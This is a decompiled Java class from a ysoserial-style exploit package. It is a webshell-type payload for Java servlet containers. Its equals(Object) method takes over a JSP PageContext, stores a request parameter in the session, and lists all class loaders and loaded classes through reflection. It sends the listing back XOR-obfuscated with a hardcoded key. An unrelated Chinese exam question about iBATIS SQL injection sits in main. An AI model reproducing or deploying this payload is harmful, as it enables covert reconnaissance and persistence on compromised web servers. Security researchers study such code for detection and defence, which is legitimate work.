package ysoserial.payloads.util;

import java.io.OutputStream;
import java.lang.reflect.Field;
import java.util.Iterator;
import java.util.Vector;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;

public class Hktalent {
   PageContext pageContext;
   HttpServletRequest request;
   HttpServletResponse response;
   OutputStream out;
   HttpSession session;
   byte[] key = new byte[]{37, 84, 74, 72, 71, 60, 62, 63, 90, 45, 41, 57, 56, 38, 94, 53};
   private int nC = 0;

   private void write(byte[] var1) {
      try {
         if (var1 != null && var1.length > 0) {
            int var2 = 0;

            for(int var3 = this.key.length; var2 < var1.length; ++var2) {
               if (var3 <= this.nC) {
                  this.nC = 0;
               }

               var1[var2] ^= this.key[this.nC++];
            }

            this.out.write(var1);
         }
      } catch (Exception var4) {
      }

   }

   private void print(String var1) {
      this.write(var1.getBytes());
   }

   private static Iterator list(ClassLoader var0) throws NoSuchFieldException, SecurityException, IllegalArgumentException, IllegalAccessException {
      Class var1;
      for(var1 = var0.getClass(); var1 != ClassLoader.class; var1 = var1.getSuperclass()) {
      }

      Field var2 = var1.getDeclaredField("classes");
      var2.setAccessible(true);
      Vector var3 = (Vector)var2.get(var0);
      return var3.iterator();
   }

   public void c() throws Exception {
      for(ClassLoader var1 = Thread.currentThread().getContextClassLoader(); var1 != null; var1 = var1.getParent()) {
         this.print("ClassLoader: " + var1 + "\n");
         Iterator var2 = list(var1);

         while(var2.hasNext()) {
            this.print("\t" + var2.next() + "\n");
         }
      }

   }

   public static void main(String[] var0) {
      Hktalent var1 = new Hktalent();
      var1.out = System.out;
      var1.write("{ibatis中$xxx$存在sql注入,结合使用场景，使用枚举、循环、迭代、逻辑判断，列举关键词和作用?（5分）test}".getBytes());
   }

   public Hktalent() {
   }

   public boolean equals(Object var1) {
      if (var1 instanceof PageContext) {
         try {
            this.pageContext = (PageContext)var1;
            this.request = (HttpServletRequest)this.pageContext.getRequest();
            this.response = (HttpServletResponse)this.pageContext.getResponse();
            this.out = this.response.getOutputStream();
            this.session = this.request.getSession(false);
            if (this.session == null) {
               this.session = this.request.getSession(true);
            }

            if (this.session != null && this.request.getParameter("c") != null) {
               this.session.setAttribute("c", this.request.getParameter("c"));
            }

            this.response.reset();
            this.response.setContentType("text/html; charset=utf-8");
            this.c();
         } catch (Exception var3) {
         }
      }

      return false;
   }
}
